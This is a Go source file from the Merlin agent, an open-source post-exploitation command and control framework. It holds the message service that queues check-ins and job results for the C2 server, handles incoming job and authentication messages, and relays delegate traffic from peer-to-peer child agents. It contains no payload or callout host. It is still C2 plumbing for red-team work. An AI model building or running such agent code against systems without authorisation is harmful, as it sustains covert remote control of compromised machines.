// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2023  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

// Package message is a service to process and return Agent Base messages
package message

import (
	// Standard
	"fmt"

	// 3rd Party
	uuid "github.com/satori/go.uuid"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/jobs"
	"github.com/Ne0nd0g/merlin/pkg/messages"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/cli"
	"github.com/Ne0nd0g/merlin-agent/services/client"
	"github.com/Ne0nd0g/merlin-agent/services/job"
	"github.com/Ne0nd0g/merlin-agent/services/p2p"
)

// Service is the structure used to interact with message objects
type Service struct {
	Agent         uuid.UUID
	ClientService *client.Service
	P2PService    *p2p.Service
	JobService    *job.Service
}

// memoryService is an in-memory instantiation of the message service
var memoryService *Service

// out is a channel of outgoing Base messages for the agent to send back to the server
var out = make(chan messages.Base, 10)

// NewMessageService is the factory to create a new service for handling base messages
func NewMessageService(agent uuid.UUID) *Service {
	if memoryService == nil {
		memoryService = &Service{
			Agent:         agent,
			ClientService: client.NewClientService(),
			P2PService:    p2p.NewP2PService(),
			JobService:    job.NewJobService(agent),
		}
	}
	if memoryService.ClientService.Synchronous() {
		// Start go routines to listen for incoming jobs and delegates
		go memoryService.getDelegates()
		go memoryService.getJobs()
	}
	return memoryService
}

// Check does not block but looks to see if there are any jobs or delegates that need to be returned to the Merlin server
func (s *Service) Check() (msg messages.Base) {
	msg.ID = s.Agent
	// Check to see if there are any Jobs to be returned to the Merlin server
	returnJobs := s.JobService.Check()
	if len(returnJobs) > 0 {
		msg.Type = messages.JOBS
		msg.Payload = returnJobs
	} else {
		msg.Type = messages.CHECKIN
	}

	// Check to see if there are any Delegate messages from a child Agent that need to be returned to the Merlin server
	delegates := s.P2PService.Check()
	if len(delegates) > 0 {
		msg.Delegates = delegates
	}
	return
}

// Get blocks until there is a return base message to send back to the Merlin server
func (s *Service) Get() (msg messages.Base) {
	return <-out
}

// getDelegates blocks waiting for a delegate message that needs to be returned to the Merlin server and adds it to the
// out channel as a message type of CHECKIN because it will not be aggregated with other return message types
func (s *Service) getDelegates() {
	for {
		msg := messages.Base{
			ID:      s.Agent,
			Type:    messages.CHECKIN,
			Payload: nil,
		}
		msg.Delegates = s.P2PService.GetDelegates()
		out <- msg
	}
}

// getJobs waits for a return job, places it in base message, and adds it to the out channel
func (s *Service) getJobs() {
	for {
		msg := messages.Base{
			ID:   s.Agent,
			Type: messages.JOBS,
		}
		msg.Payload = s.JobService.Get()
		out <- msg
	}
}

// Handle processes incoming Base messages for this Agent
func (s *Service) Handle(msg messages.Base) (err error) {
	cli.Message(cli.DEBUG, fmt.Sprintf("services/messages.Handle(): Entering into function with: %+v", msg))
	cli.Message(cli.SUCCESS, fmt.Sprintf("%s message type received!", messages.String(msg.Type)))

	if msg.ID != s.Agent {
		cli.Message(cli.WARN, fmt.Sprintf("Input message was not for this agent (%s):\n%+v", s.Agent, msg))
	}

	switch msg.Type {
	case messages.IDLE:
		cli.Message(cli.NOTE, "Received idle command, doing nothing")
	case messages.JOBS:
		s.JobService.Handle(msg.Payload.([]jobs.Job))
	case messages.OPAQUE:
		err = s.ClientService.Authenticate(msg)
		if err != nil {
			s.JobService.AddResult(s.Agent, "", err.Error())
			return
		}
	default:
		stdErr := fmt.Sprintf("%s is not a valid message type", messages.String(msg.Type))
		s.JobService.AddResult(s.Agent, "", stdErr)
	}

	// If there are any Delegate messages, send them to the Handler
	if len(msg.Delegates) > 0 {
		s.P2PService.Handle(msg.Delegates)
	}

	cli.Message(cli.DEBUG, "services/messages.Handle(): Leaving function...")
	return
}
